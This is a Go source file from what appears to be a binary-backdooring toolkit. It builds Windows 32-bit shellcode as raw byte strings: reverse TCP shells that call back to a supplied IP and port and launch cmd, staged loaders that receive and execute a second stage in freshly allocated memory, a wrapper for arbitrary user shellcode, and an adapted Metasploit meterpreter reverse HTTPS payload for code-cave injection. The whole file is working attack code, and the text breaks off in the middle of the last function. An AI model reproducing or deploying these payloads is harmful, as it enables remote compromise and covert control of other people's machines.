package modules

import (
	"strings"

	"github.com/Binject/shellcode/api"
)

func init() {
	api.RegisterShellCode(api.Windows, api.Intel32,
		"iat_reverse_tcp_inline", iat_reverse_tcp_inline_win_intel_32)
	api.RegisterShellCode(api.Windows, api.Intel32,
		"iat_reverse_tcp_inline_threaded", iat_reverse_tcp_inline_threaded_win_intel_32)
	api.RegisterShellCode(api.Windows, api.Intel32,
		"iat_reverse_tcp_stager_threaded", iat_reverse_tcp_stager_threaded_win_intel_32)
	api.RegisterShellCode(api.Windows, api.Intel32,
		"iat_user_shellcode_threaded", iat_user_shellcode_threaded_win_intel_32)

	api.RegisterShellCode(api.Windows, api.Intel32,
		"meterpreter_reverse_https_threaded", meterpreter_reverse_https_threaded_win_intel_32)
	api.RegisterShellCode(api.Windows, api.Intel32,
		"reverse_tcp_shell_inline", reverse_tcp_shell_inline_win_intel_32)
	api.RegisterShellCode(api.Windows, api.Intel32,
		"reverse_tcp_stager_threaded", reverse_tcp_stager_threaded_win_intel_32)
	api.RegisterShellCode(api.Windows, api.Intel32,
		"user_shellcode_threaded", user_shellcode_threaded_win_intel_32)
}

const (
	win32_stackpreserve string = "\x90\x90\x60\x9c"
	win32_stackrestore  string = "\x9d\x61"
)

func iat_reverse_tcp_inline_win_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	var LoadLibraryA, GetProcAddress, ImageBase uint32
	ip := params.IP
	xpMode := true

	/*
	   Position dependent shellcode that uses API thunks of LoadLibraryA and
	   GetProcAddress to find and load APIs for callback to C2.
	*/
	shellcode1 := "\xfc" // CLD
	if xpMode {
		shellcode1 += "\x89\xe5" + // mov ebp, esp
			"\x31\xd2" + // xor edx, edx
			"\x64\x8b\x52\x30" + // mov edx, dword ptr fs:[edx + 0x30]
			"\x8b\x52\x08" // mov edx, dword ptr [edx + 8]
	}
	shellcode1 += "\xbb" // mov value below to EBX
	if xpMode {
		var val uint32
		if LoadLibraryA-ImageBase < 0 {
			val = 0xffffffff + (LoadLibraryA - ImageBase + 1)
		} else {
			val = LoadLibraryA - ImageBase
		}
		if ps, err := api.PackUint32(val); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
		shellcode1 += "\x01\xD3" // add EBX + EDX
		shellcode1 += "\xb9"     // mov value below to ECX
		var valb uint32
		if GetProcAddress-ImageBase < 0 {
			valb = 0xffffffff + (GetProcAddress - ImageBase + 1)
		} else {
			valb = GetProcAddress - ImageBase
		}
		if ps, err := api.PackUint32(valb); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
	} else {
		var valc uint32
		if LoadLibraryA-(entry+ImageBase) < 0 {
			valc = 0xffffffff + (LoadLibraryA - (entry + ImageBase) + 1)
		} else {
			valc = LoadLibraryA - (entry + ImageBase)
		}
		if ps, err := api.PackUint32(valc); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
		shellcode1 += "\x01\xD3" // add EBX + EDX
		shellcode1 += "\xb9"     // mov value below to ECX
		var vald uint32
		if GetProcAddress-(entry+ImageBase) < 0 {
			vald = 0xffffffff + (GetProcAddress - (entry + ImageBase) + 1)
		} else {
			vald = GetProcAddress - (entry + ImageBase)
		}
		if ps, err := api.PackUint32(vald); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
	}
	shellcode1 += "\x01\xD1" // add ECX + EDX

	shellcode1 += "\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68" +
		"\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50" +
		"\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x90\x90\xFF\xD5\x68" +
		"\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57" +
		"\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95" +
		"\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD" +
		"\x95\x6A\x05\x68"

	shellcode1 += api.PackIP(ip)
	shellcode1 += "\x68\x02\x00"
	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x89\xE2\x6A" +
		"\x10\x52\x51\x87\xF9\xFF\xD5"

	shellcode2 := "\x6A\x00\x68\x65\x6C" +
		"\x33\x32\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x73\x41\x00\x00\x68" +
		"\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50" +
		"\xFF\x16\x95\x93\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x87\xFE" +
		"\x92\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01" +
		"\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56" +
		"\x56\x53\x56\x87\xDA\xFF\xD5\x89\xE6\x6A\x00\x68\x65\x6C\x33\x32" +
		"\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x65\x63\x74\x00\x68\x65\x4F" +
		"\x62\x6A\x68\x69\x6E\x67\x6C\x68\x46\x6F\x72\x53\x68\x57\x61\x69" +
		"\x74\x54\x50\x95\xFF\x17\x95\x89\xF2\x31\xF6\x4E\x56\x46\x89\xD4" +
		"\xFF\x32\x96\xFF\xD5\x81\xC4\x34\x02\x00\x00"

	return []byte(win32_stackpreserve + shellcode1 + shellcode2 + win32_stackrestore), nil
}

func iat_reverse_tcp_inline_threaded_win_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	var LoadLibraryA, GetProcAddress, ImageBase, VirtualAlloc, CreateThread uint32
	xpMode := true
	ip := params.IP

	/*
	   Non-staged iat based payload.
	*/
	shellcode2 := "\xE8\xE5\xFF\xFF\xFF"
	shellcode2 += strings.Repeat("\x41", 58)
	shellcode2 += "\xFC" +
		"\x60" + // pushal
		"\x89\xe5" + // mov ebp, esp
		"\x31\xd2" + // xor edx, edx
		"\x64\x8b\x52\x30" + // mov edx, dword ptr fs:[edx + 0x30]
		"\x8b\x52\x08" // mov edx, dword ptr [edx + 8]
		// entry point is now in edx

	shellcode2 += "\xbb" // mov value below to EBX
	var val uint32
	if LoadLibraryA-ImageBase < 0 {
		val = 0xffffffff + (LoadLibraryA - ImageBase) + 1
	} else {
		val = LoadLibraryA - ImageBase
	}
	if ps, err := api.PackUint32(val); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x01\xD3" // add EBX + EDX
	shellcode2 += "\xb9"     // mov value below to ECX

	if GetProcAddress-ImageBase < 0 {
		val = 0xffffffff + GetProcAddress - ImageBase + 1
	} else {
		val = GetProcAddress - ImageBase
	}
	if ps, err := api.PackUint32(val); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x01\xD1" // add ECX + EDX
	shellcode2 += "\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68" +
		"\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50" +
		"\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x90\x90\xFF\xD5\x68" +
		"\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57" +
		"\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95" +
		"\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD" +
		"\x95\x6A\x05\x68"

	shellcode2 += api.PackIP(ip) // IP
	shellcode2 += "\x68\x02\x00"
	if ps, err := api.PackPort(port); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x89\xE2\x6A" +
		"\x10\x52\x51\x87\xF9\xFF\xD5"

	shellcode2 += "\x85\xC0\x74\x00\x6A\x00\x68\x65\x6C" +
		"\x33\x32\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x73\x41\x00\x00\x68" +
		"\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50" +
		"\xFF\x16\x95\x93\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x87\xFE" +
		"\x92\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01" +
		"\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56" +
		"\x56\x53\x56\x87\xDA\xFF\xD5\x89\xE6\x6A\x00\x68\x65\x6C\x33\x32" +
		"\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x65\x63\x74\x00\x68\x65\x4F" +
		"\x62\x6A\x68\x69\x6E\x67\x6C\x68\x46\x6F\x72\x53\x68\x57\x61\x69" +
		"\x74\x54\x50\x95\xFF\x17\x95\x89\xF2\x31\xF6\x4E\x56\x46" + // \x89\xD4"
		"\xFF\x32\x96\xFF\xD5" // \x81\xC4\x34\x02\x00\x00"

	// ExitFunc
	// Just try exitthread...
	shellcode2 += "\x68\x6f\x6e\x00\x00" +
		"\x68\x65\x72\x73\x69" +
		"\x68\x47\x65\x74\x56" + // GetVersion
		"\x54" + // push esp
		"\x56" + // push esi
		"\xff\x17" + // call dword ptr ds: [edi] ; getprocaddress
		"\xff\xd0" + // call eax ; getversion
		"\x3c\x06" + // cmp al, 6
		"\x7D\x13" + // jl short
		"\x68\x61\x64\x00\x00" + // ...
		"\x68\x54\x68\x72\x65" + // ...
		"\x68\x45\x78\x69\x74" + // ExitThread
		"\x54" + // push esp
		"\x56" + // push ebp (kernel32)
		"\xeb\x28" + // jmp short to push getprocaddress
		"\x68\x6c\x00\x00\x00" + // ...
		"\x68\x6e\x74\x64\x6c" + // ntdll
		"\x54" + // push esp
		"\xff\x13" + // call dword ptr ds:[ebx] loadliba
		"\x68\x64\x00\x00\x00" + // ...
		"\x68\x68\x72\x65\x61" + // ...
		"\x68\x73\x65\x72\x54" + // ...
		"\x68\x78\x69\x74\x55" + // ...
		"\x68\x52\x74\x6c\x45" + // RtlExitUserThread
		"\x54" + // push esp
		"\x50" + // push eax
		"\xff\x17" + // call getprocaddress
		"\x6a\x00" + // push 0
		"\xff\xd0" // call eax

	//starts the VirtualAlloc/CreateThread section for the PAYLOAD
	shellcode1 := "\xFC" // Cld
	if xpMode {
		shellcode1 += "\x89\xe5" + // mov ebp, esp
			"\x31\xd2" + // xor edx, edx
			"\x64\x8b\x52\x30" + // mov edx, dword ptr fs:[edx + 0x30]
			"\x8b\x52\x08" // mov edx, dword ptr [edx + 8]
	}
	shellcode1 += "\xbb" // mov value below to EBX
	//Put VirtualAlloc in EBX
	if xpMode {
		if VirtualAlloc-ImageBase < 0 {
			val = 0xffffffff + VirtualAlloc - ImageBase + 1
		} else {
			val = VirtualAlloc - ImageBase
		}
		if ps, err := api.PackUint32(val); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}

		shellcode1 += "\x01\xD3" // add EBX + EDX
		//Put Create Thread in ECX
		shellcode1 += "\xb9" // mov value below to ECX
		if CreateThread-ImageBase < 0 {
			val = 0xffffffff + CreateThread - ImageBase + 1
		} else {
			val = CreateThread - ImageBase
		}
		if ps, err := api.PackUint32(val); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}

	} else {
		if VirtualAlloc-entry+ImageBase < 0 {
			val = 0xffffffff + VirtualAlloc - entry + ImageBase + 1
		} else {
			val = VirtualAlloc - entry + ImageBase
		}
		if ps, err := api.PackUint32(val); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
		shellcode1 += "\x01\xD3" // add EBX + EDX
		//Put Create Thread in ECX
		shellcode1 += "\xb9" // mov value below to ECX
		if CreateThread-(entry+ImageBase) < 0 {
			val = 0xffffffff + (CreateThread - (entry + ImageBase) + 1)
		} else {
			val = CreateThread - (entry + ImageBase)
		}
	}
	//Add in memory base
	shellcode1 += "\x01\xD1" // add ECX + EDX
	shellcode1 += "\x8B\xE9" // mov EDI, ECX for save keeping

	shellcode1 += "\xBE"
	if ps, err := api.PackUint16(uint16(len(shellcode2) - 5)); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x00\x00" +
		"\x6A\x40" +
		"\x68\x00\x10\x00\x00" +
		"\x56" +
		"\x6A\x00"
	shellcode1 += "\xff\x13" // call dword ptr [ebx]
	shellcode1 += "\x89\xC3" +
		"\x89\xC7" +
		"\x89\xF1"

	shellcode1 += "\xeb\x16" // <--length of shellcode below
	shellcode1 += "\x5e"
	shellcode1 += "\xF2\xA4" +
		"\x31\xC0" +
		"\x50" +
		"\x50" +
		"\x50" +
		"\x53" +
		"\x50" +
		"\x50"

	shellcode1 += "\x3E\xFF\x55\x00" // Call DWORD PTR DS: [EBP]
	shellcode1 += "\x58" +
		"\x61" // POP AD

	shellcode1 += "\xe9"
	if ps, err := api.PackUint32(uint32(len(shellcode2))); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	return []byte(win32_stackpreserve + shellcode1 + shellcode2), nil
}

func iat_reverse_tcp_stager_threaded_win_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	var LoadLibraryA, GetProcAddress, ImageBase, VirtualAlloc, CreateThread uint32
	xpMode := true
	ip := params.IP

	/*
	   Staged iat based payload.
	*/
	shellcode2 := "\xE8\xE5\xFF\xFF\xFF"
	shellcode2 += strings.Repeat("\x41", 58)
	shellcode2 += "\xFC" +
		"\x60" + // pushal
		"\x89\xe5" + // mov ebp, esp
		"\x31\xd2" + // xor edx, edx
		"\x64\x8b\x52\x30" + // mov edx, dword ptr fs:[edx + 0x30]
		"\x8b\x52\x08" // mov edx, dword ptr [edx + 8]
		// entry point is now in edx
	shellcode2 += "\xbb"
	var val uint32 // mov value below to EBX
	if LoadLibraryA-ImageBase < 0 {
		val = 0xffffffff + (LoadLibraryA - ImageBase + 1)
	} else {
		val = LoadLibraryA - ImageBase
	}
	if ps, err := api.PackUint32(val); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x01\xD3" // add EBX + EDX
	shellcode2 += "\xb9"     // mov value below to ECX

	if GetProcAddress-ImageBase < 0 {
		val = 0xffffffff + (GetProcAddress - ImageBase + 1)
	} else {
		val = GetProcAddress - ImageBase
	}
	if ps, err := api.PackUint32(val); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x01\xD1" // add ECX + EDX
	//LoadLibraryA in EBX
	//GetProcAddress in ECX

	shellcode2 += "\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68" +
		"\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50" +
		"\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x90\x90\xFF\xD5\x68" +
		"\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57" +
		"\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95" +
		"\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD" +
		"\x95\x6A\x05\x68"
	shellcode2 += api.PackIP(ip) // HOST
	shellcode2 += "\x68\x02\x00" // PORT
	if ps, err := api.PackPort(port); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x89\xE2\x6A" +
		"\x10\x52\x51\x87\xF9\xFF\xD5"

	//PART TWO
	//ESI getprocaddr
	//EBX loadliba
	//ESP ptr to sockaddr struct
	//EDI has the socket
	shellcode2 += "\x89\xe5" + // mov edp, esp
		"\x68\x33\x32\x00\x00" + // push ws2_32
		"\x68\x77\x73\x32\x5F" + // ...
		"\x54" + // push esp
		"\xFF\x13" + // call dword ptr [ebx]
		"\x89\xc1" + // mov ecx, eax
		"\x6A\x00" +
		"\x68\x72\x65\x63\x76" + // recv, 0
		"\x54" + // push esp
		"\x51" + // push ecx
		"\xFF\x16" + // call dword ptr [esi]; get handle for recv
		//save recv handle off
		"\x50" + // push eax; save revc handle for later
		"\x6A\x00" + // push byte 0x0
		"\x6A\x04" + // push byte 4
		"\x55" + // push ebp sockaddr struct
		"\x57" + // push edi (saved socket)
		"\xff\xD0" + // call eax; recv (s, &dwLength, 4, 0)
		//esp now points to recv handle
		"\x8b\x34\x24" + // lea esi, [esp]
		"\x8b\x6d\x00" + // mov ebp, dword ptr[ebp]
		// Don't need loadliba/getprocaddr anymore
		"\x31\xd2" + // xor edx, edx
		"\x64\x8b\x52\x30" + // mov edx, dword ptr fs:[edx + 0x30]
		"\x8b\x52\x08" // mov edx, dword ptr [edx + 8]
		//entry point in EDX

	shellcode2 += "\xbb" // mov value below to EBX

	//Put VirtualAlloc in EBX
	if VirtualAlloc-ImageBase < 0 {
		val = 0xffffffff + VirtualAlloc - ImageBase + 1
	} else {
		val = VirtualAlloc - ImageBase
	}
	if ps, err := api.PackUint32(val); err == nil {
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x01\xD3"   // add EBX + EDX
	shellcode2 += "\x6a\x40" + // push byte 0x40
		"\x68\x00\x10\x00\x00" + // push 0x1000
		"\x55" + // push ebp
		"\x6A\x00" + // push byte 0
		"\xff\x13" + // Call VirtualAlloc from thunk
		// do not need virualalloc anymore
		"\x93" + // xchg ebx, eax
		"\x53" + // push ebx ; mem location (return to it later)
		"\x6a\x00" + // push byte 0
		"\x55" + // push ebp ; length
		"\x53" + // push ebx ; current address
		"\x57" + // push edi ; socket
		"\xFF\xD6" + // call esi ; recv handle
		"\x01\xc3" + // add ebx, eax
		"\x29\xc5" + // sub ebp, eax
		"\x75\xf3" + // jump back
		"\xc3" // ret

	//starts the VirtualAlloc/CreateThread section for the PAYLOAD
	shellcode1 := "\xFC" // Cld
	if xpMode {
		shellcode1 += "\x89\xe5" + // mov ebp, esp
			"\x31\xd2" + // xor edx, edx
			"\x64\x8b\x52\x30" + // mov edx, dword ptr fs:[edx + 0x30]
			"\x8b\x52\x08" // mov edx, dword ptr [edx + 8]
	}
	shellcode1 += "\xbb" // mov value below to EBX
	//Put VirtualAlloc in EBX
	if xpMode {
		if VirtualAlloc-ImageBase < 0 {
			val = 0xffffffff + VirtualAlloc - ImageBase + 1
		} else {
			val = VirtualAlloc - ImageBase
		}
		if ps, err := api.PackUint32(val); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
		shellcode1 += "\x01\xD3" // add EBX + EDX
		//Put Create Thread in ECX
		shellcode1 += "\xb9" // mov value below to ECX
		if CreateThread-ImageBase < 0 {
			val = 0xffffffff + (CreateThread - ImageBase) + 1
		} else {
			val = CreateThread - ImageBase
		}
		if ps, err := api.PackUint32(val); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
	} else {
		if VirtualAlloc-(entry+ImageBase) < 0 {
			val = 0xffffffff + (VirtualAlloc - (entry + ImageBase) + 1)
		} else {
			val = VirtualAlloc - (entry + ImageBase)
		}
		shellcode1 += "\x01\xD3" // add EBX + EDX
		//Put Create Thread in ECX
		shellcode1 += "\xb9" // mov value below to ECX
		if CreateThread-(entry+ImageBase) < 0 {
			val = 0xffffffff + (CreateThread - (entry + ImageBase) + 1)
		} else {
			val = CreateThread - (entry + ImageBase)
		}
	}
	//Add in memory base
	shellcode1 += "\x01\xD1" // add ECX + EDX
	shellcode1 += "\x8B\xE9" // mov EDI, ECX for save keeping

	shellcode1 += "\xBE"
	if ps, err := api.PackUint32(uint32(len(shellcode2)) - 5); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x6A\x40" +
		"\x68\x00\x10\x00\x00" +
		"\x56" +
		"\x6A\x00"
	shellcode1 += "\xff\x13" // call dword ptr [ebx]
	shellcode1 += "\x89\xC3" +
		"\x89\xC7" +
		"\x89\xF1"

	shellcode1 += "\xeb\x16" // <--length of shellcode below

	shellcode1 += "\x5e"
	shellcode1 += "\xF2\xA4" +
		"\x31\xC0" +
		"\x50" +
		"\x50" +
		"\x50" +
		"\x53" +
		"\x50" +
		"\x50"

	shellcode1 += "\x3E\xFF\x55\x00" // Call DWORD PTR DS: [EBP]
	shellcode1 += "\x58" +
		"\x61" // POP AD

	shellcode1 += "\xe9"
	if ps, err := api.PackUint32(uint32(len(shellcode2))); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	return []byte(win32_stackpreserve + shellcode1 + shellcode2), nil
}

func iat_user_shellcode_threaded_win_intel_32(params api.Parameters) ([]byte, error) {
	entry := params.Entry
	var ImageBase, VirtualAlloc, CreateThread uint32
	xpMode := true

	/*
	   Staged
	*/
	shellcode2 := "\xE8\xE5\xFF\xFF\xFF"
	//Can inject any shellcode below.
	shellcode2 += strings.Repeat("\x41", 58)

	shellcode2 += string(params.ShellCode)

	shellcode1 := "\xFC" // Cld
	if xpMode {
		shellcode1 += "\x89\xe5" + // mov ebp, esp
			"\x31\xd2" + // xor edx, edx
			"\x64\x8b\x52\x30" + // mov edx, dword ptr fs:[edx + 0x30]
			"\x8b\x52\x08" // mov edx, dword ptr [edx + 8]
	}
	shellcode1 += "\xbb" // mov value below to EBX
	//Put VirtualAlloc in EBX
	if xpMode {
		var val uint32
		if VirtualAlloc-ImageBase < 0 {
			val = 0xffffffff + VirtualAlloc - ImageBase + 1
		} else {
			val = VirtualAlloc - ImageBase
		}
		if ps, err := api.PackUint32(val); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
		shellcode1 += "\x01\xD3" // add EBX + EDX
		//Put Create Thread in ECX
		shellcode1 += "\xb9" // mov value below to ECX
		if CreateThread-ImageBase < 0 {
			val = 0xffffffff + (CreateThread - ImageBase) + 1
		} else {
			val = CreateThread - ImageBase
		}
		if ps, err := api.PackUint32(val); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
	} else {
		var val uint32
		if VirtualAlloc-entry+ImageBase < 0 {
			val = 0xffffffff + (VirtualAlloc - (entry + ImageBase) + 1)
		} else {
			val = VirtualAlloc - (entry + ImageBase)
		}
		if ps, err := api.PackUint32(val); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
		shellcode1 += "\x01\xD3" // add EBX + EDX
		//Put Create Thread in ECX
		shellcode1 += "\xb9" // mov value below to ECX
		if CreateThread-entry+ImageBase < 0 {
			val = 0xffffffff + (CreateThread - (entry + ImageBase) + 1)
		} else {
			val = CreateThread - (entry + ImageBase)
		}
		if ps, err := api.PackUint32(val); err == nil {
			shellcode1 += ps
		} else {
			return nil, err
		}
	}
	//Add in memory base
	shellcode1 += "\x01\xD1" // add ECX + EDX
	shellcode1 += "\x8B\xE9" // mov EDI, ECX for save keeping
	shellcode1 += "\xBE"
	if ps, err := api.PackUint32(uint32(len(shellcode2)) - 5); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}

	shellcode1 += "\x6A\x40" +
		"\x68\x00\x10\x00\x00" +
		"\x56" +
		"\x6A\x00"
	shellcode1 += "\xff\x13" // call dword ptr [ebx]
	shellcode1 += "\x89\xC3" +
		"\x89\xC7" +
		"\x89\xF1"

	shellcode1 += "\xeb\x16" // <--length of shellcode below
	shellcode1 += "\x5e"
	shellcode1 += "\xF2\xA4" +
		"\x31\xC0" +
		"\x50" +
		"\x50" +
		"\x50" +
		"\x53" +
		"\x50" +
		"\x50"

	shellcode1 += "\x3E\xFF\x55\x00" // Call DWORD PTR DS: [EBP]
	shellcode1 += "\x58" +
		"\x61" // POP AD
	shellcode1 += "\xe9"
	if ps, err := api.PackUint32(uint32(len(shellcode2))); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}

	return []byte(win32_stackpreserve + shellcode1 + shellcode2), nil
}

func meterpreter_reverse_https_threaded_win_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	//entry := params.Entry
	ip := params.IP

	/*
	   Traditional meterpreter reverse https shellcode from metasploit
	   modified to support cave jumping.
	*/
	shellcode2 := "\xE8\xB7\xFF\xFF\xFF"
	shellcode2 += strings.Repeat("\x41", 58)

	shellcode2 += "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30" +
		"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff" +
		"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2" +
		"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85" +
		"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3" +
		"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d" +
		"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58" +
		"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b" +
		"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff" +
		"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68" +
		"\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57" +
		"\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f" +
		"\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68"
	if ps, err := api.PackPort(port); err == nil { // PORT
		shellcode2 += ps
	} else {
		return nil, err
	}
	shellcode2 += "\x00\x00\x53" +
		"\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68" +
		"\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b" +
		"\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a" +
		"\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57" +
		"\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a" +
		"\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x48\x45" +
		"\x56\x79\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00" +
		"\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff" +
		"\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68" +
		"\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85" +
		"\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff"
	shellcode2 += ip
	shellcode2 += "\x00"

	//shellcode1 is the thread
	shellcode1 := "\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B" +
		"\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02" +
		"\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61" +
		"\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B" +
		"\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48" +
		"\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0" +
		"\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B" +
		"\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF" +
		"\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D" +
		"\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B" +
		"\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04" +
		"\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB" +
		"\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90" +
		"\x5D\x90"

	shellcode1 += "\xBE"
	if ps, err := api.PackUint16(uint16(len(shellcode2) - 5)); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x00\x00" // <---Size of shellcode2 in hex
	shellcode1 += "\x90\x6A\x40\x90\x68\x00\x10\x00\x00" +
		"\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90" +
		"\x89\xF1"

	shellcode1 += "\xeb\x44" // <--length of shellcode below
	shellcode1 += "\x90\x5e"
	shellcode1 += "\x90\x90\x90" +
		"\xF2\xA4" +
		"\xE8\x20\x00\x00" +
		"\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06" +
		"\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF" +
		"\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5" +
		"\x58\x58\x90\x61"

	shellcode1 += "\xE9"
